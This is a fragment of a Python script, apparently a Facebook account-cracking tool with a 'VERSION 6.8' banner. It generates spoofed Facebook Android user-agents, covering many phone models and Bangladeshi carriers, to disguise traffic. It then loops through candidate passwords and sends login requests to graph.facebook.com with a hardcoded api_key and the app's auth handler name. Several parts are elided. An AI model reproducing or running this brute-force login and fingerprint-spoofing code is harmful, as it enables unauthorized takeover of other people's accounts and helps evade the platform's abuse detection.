...
def random_dalvik_all_models(count: int = 1, seed: Optional[int] = None) -> List[str]:
    """
    Generate realistic Dalvik-style Facebook Android User-Agent(s)
    covering a mix of popular phone models (BD + global).

    Args:
        count: how many user-agents to generate (default 1)
        seed: optional random seed for reproducibility

    Returns:
        List of UA strings (length == count)
    """
    if seed is not None:
        random.seed(seed)
    ...
    android_versions: List[Tuple[str, str]] = [
        ("14", "34"),
        ("13", "33"),
        ("12", "31"),
        ("11", "30"),
    ...
    devices: List[Tuple[str, str]] = [
        # Samsung
        ("Samsung", "SM-A135F"), ("Samsung", "SM-M326B"), ("Samsung", "SM-G991B"),
        ("Samsung", "SM-A525F"), ("Samsung", "SM-A715F"), ("Samsung", "SM-M336B"),

        # Xiaomi / Redmi / Poco
        ("Xiaomi", "2201117TG"), ("Xiaomi", "M2004J19C"), ("Xiaomi", "22041219I"),
        ("Redmi", "2201116TG"), ("Redmi", "M2010J19SG"), ("POCO", "22041216UG"),

        # Realme
        ("realme", "RMX3085"), ("realme", "RMX2185"), ("realme", "RMX3511"),
        ("realme", "RMX3472"), ("realme", "RMX3572"),

        # Oppo
        ("OPPO", "CPH2239"), ("OPPO", "CPH2325"), ("OPPO", "CPH2371"),
        ("OPPO", "CPH2421"), ("OPPO", "CPH2457"),

        # Vivo
        ("vivo", "V2140"), ("vivo", "V2043"), ("vivo", "V2111"),
        ("vivo", "V2132"), ("vivo", "V2207"),

        # Infinix
        ("Infinix", "X688B"), ("Infinix", "X6511"), ("Infinix", "X6815C"),
        ("Infinix", "X6739"), ("Infinix", "X6525"),

        # Tecno
        ("TECNO", "KI5k"), ("TECNO", "BD4h"), ("TECNO", "CH6i"),
        ("TECNO", "CK8n"), ("TECNO", "CG7n"),

        # OnePlus
        ("OnePlus", "DN2101"), ("OnePlus", "KB2001"), ("OnePlus", "LE2101"),

        # Huawei
        ("HUAWEI", "VOG-L29"), ("HUAWEI", "ANE-LX2"), ("HUAWEI", "MAR-LX1M"),

        # Google Pixel
        ("Google", "Pixel 6a"), ("Google", "Pixel 7"), ("Google", "Pixel 8 Pro"),
    ]

    def _random_build_prefix(sdk: str) -> str:
        # Simple varied build prefix generator — keeps it realistic but random.
        # e.g. TP1A.220xxx, SQ1A.230xxx, SKQ1.211xxx etc.
        prefixes = ["TP1A", "SQ1A", "SKQ1", "RP1A", "SP1A"]
        return random.choice(prefixes)

    results: List[str] = []
    for _ in range(count):
        fbbv = str(random.randint(10_000_000, 99_999_999))
        fbav = f"{random.randint(400, 450)}.0.0.{random.randint(1, 60)}.{random.randint(50, 250)}"

        release, sdk = random.choice(android_versions)
        brand, model = random.choice(devices)

        # Some models have spaces — replace with underscores in Build token but keep readable in FBDV
        model_for_build = model.replace(" ", "_")

        density = random.choice(["1.0", "1.5", "2.0", "2.5", "3.0"])
        build_prefix = _random_build_prefix(sdk)
        build_number = f"{build_prefix}.{random.randint(210000, 240000)}.{random.randint(1,999)}"

        # Compose UA string
        ua = (
            f"Dalvik/2.1.0 (Linux; U; Android {release}; {model} "
            f"Build/{build_number}) "
            f"[FBAN/{fban};FBAV/{fbav};FBBV/{fbbv};FBPN/{fbpn};FBLC/en_US;"
            f"FBDV/{model};FBSV/{release};FBCA/armeabi-v7a:armeabi;FBDM/{{density={density}}};FB_FW/1;]"
        )
...
if __name__ == "__main__":
    # generate one UA
    print(random_dalvik_all_models(count=1, seed=42)[0])

    # generate 5 UAs
    for u in random_dalvik_all_models(count=5):
        print(u)
#─━─━─━─━[User Agent]━─━─━─━─━#
# M2
def yousuffile():
...
def random_dalvik_bd_working():
    """
    Generate a realistic Dalvik-style Facebook Android User-Agent
    tuned for Bangladeshi devices & networks.
    Works smoothly across Facebook APIs and apps.
    """
    fban = "FB4A"
    fbpn = "com.facebook.katana"

    # ✅ Facebook version (matches official app builds)
    facebook_version = f"{random.randint(420, 485)}.0.0.{random.randint(10, 70)}.{random.randint(70, 200)}"
    fbbv = str(random.randint(20000000, 99999999))

    # ✅ Display metrics (BD device resolutions)
    density = random.choice(["1.5", "2.0", "2.5", "3.0"])
    width = random.choice(["720", "1080"])
    height = random.choice(["1440", "1600", "1920", "2400", "2560"])

    # ✅ BD carriers only
    fbcr = random.choice(["Grameenphone", "Robi", "Banglalink", "Airtel", "Teletalk"])
    fblc = random.choice(["bn_BD", "en_US"])

    # ✅ Most common Bangladeshi & popular imported phones
    devices = [
        # Xiaomi / Poco
        ("Xiaomi", "Redmi Note 13"), ("Xiaomi", "Redmi Note 12"), ("Xiaomi", "Poco X6 Pro"),
        ("Xiaomi", "Redmi 13C"), ("Xiaomi", "Redmi Note 11 Pro"),

        # Samsung
        ("Samsung", "Galaxy A14"), ("Samsung", "Galaxy A15"), ("Samsung", "Galaxy A24"),
        ("Samsung", "Galaxy A34"), ("Samsung", "Galaxy M33"), ("Samsung", "Galaxy A54"),
        ...
        ("Tecno", "Tecno Pova 5"), ("Tecno", "Tecno Pop 8"),
        ("Infinix", "Infinix Hot 40i"), ("Infinix", "Infinix Note 30"),

        # Symphony / Walton / Itel (local brands)
        ("Symphony", "Symphony Z60"), ("Symphony", "Symphony Z55"),
        ("Walton", "Walton Primo H10"), ("Walton", "Walton Primo RX9"),
        ("Itel", "Itel S23"), ("Itel", "Itel A70"), ("Itel", "Itel Vision 3"),
    ]
    fbmf, fbdv = random.choice(devices)
    fbbd = fbmf

    # ✅ Android version realistic for BD phones
    fbsv = str(random.choice([11, 12, 13, 14]))

    # ✅ Real build fingerprints (based on actual Android builds)
    build = random.choice([
        "UP1A.240205.002", "UP1A.231005.007", "TQ3A.230901.001",
        "TP1A.220624.014", "SP1A.210812.016", "RQ3A.210705.001"
    ])

    # ✅ Final UA — clean, BD-accurate
    ua = (
        ...
        f"FBPN/{fbpn};FBDV/{fbdv};FBSV/{fbsv};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    )
...
def random_dalvik_all_devices_working():
    """
    Generate a fully realistic Dalvik-style Facebook Android User-Agent
    covering all popular BD + Global devices.
    Works smoothly on most API endpoints & scrapers.
    """
    fban = "FB4A"
    fbpn = "com.facebook.katana"

    # ✅ Facebook version (matches official build pattern)
    facebook_version = f"{random.randint(420, 490)}.0.0.{random.randint(10, 80)}.{random.randint(70, 200)}"
    fbbv = str(random.randint(20000000, 99999999))

    # ✅ Display metrics (based on real device specs)
    density = random.choice(["1.0", "1.5", "2.0", "2.5", "3.0"])
    width = random.choice(["720", "1080", "1440"])
    height = random.choice(["1280", "1920", "2400", "2560", "3000"])

    # ✅ Carriers (Bangladesh + Global mix)
    fbcr = random.choice([
        "Grameenphone", "Robi", "Banglalink", "Airtel", "Teletalk",
        "Jio", "AirtelIN", "TMobile", "Verizon", "Vodafone"
    ])
    fblc = random.choice(["en_US", "bn_BD", "en_GB", "en_IN"])

    # ✅ All Working Devices (BD + Global)
    devices = [
        # Xiaomi / Poco
        ("Xiaomi", "Redmi Note 13"), ("Xiaomi", "Redmi Note 12 Pro"),
        ("Xiaomi", "Poco X6 Pro"), ("Xiaomi", "Poco F5"), ("Xiaomi", "Xiaomi 14"),

        # Samsung
        ("Samsung", "Galaxy A15"), ("Samsung", "Galaxy A34"), ("Samsung", "Galaxy A54"),
        ("Samsung", "Galaxy S22 Ultra"), ("Samsung", "Galaxy S23"), ("Samsung", "Galaxy S24"),

        # Realme
        ("Realme", "Realme 11 Pro+"), ("Realme", "Realme C55"), ("Realme", "Realme 12 Pro"),

        # Oppo / Vivo
        ("Oppo", "Oppo F21 Pro"), ("Oppo", "Oppo Reno 10"), ("Oppo", "Oppo Find X6"),
        ("Vivo", "Vivo V29e"), ("Vivo", "Vivo Y36"), ("Vivo", "Vivo X80"),

        # Tecno / Infinix
        ("Tecno", "Tecno Camon 20"), ("Tecno", "Tecno Pova 5"), ("Tecno", "Tecno Phantom X2"),
        ("Infinix", "Infinix Note 30"), ("Infinix", "Infinix GT 10 Pro"),

        # OnePlus / Google
        ("OnePlus", "OnePlus 12R"), ("OnePlus", "OnePlus Nord 3"),
        ("Google", "Pixel 7"), ("Google", "Pixel 8"), ("Google", "Pixel 8a"),

        # Symphony / Walton / Itel
        ("Symphony", "Symphony Z60"), ("Symphony", "Symphony Z55"),
        ("Walton", "Walton Primo H10"), ("Walton", "Walton Primo RX9"),
        ("Itel", "Itel S23"), ("Itel", "Itel Vision 3"),
    ]
    fbmf, fbdv = random.choice(devices)
    fbbd = fbmf

    # ✅ Android version (11–14 realistic)
    fbsv = str(random.randint(11, 14))
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 6.8
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_bd_working(),
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_all_devices_working(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
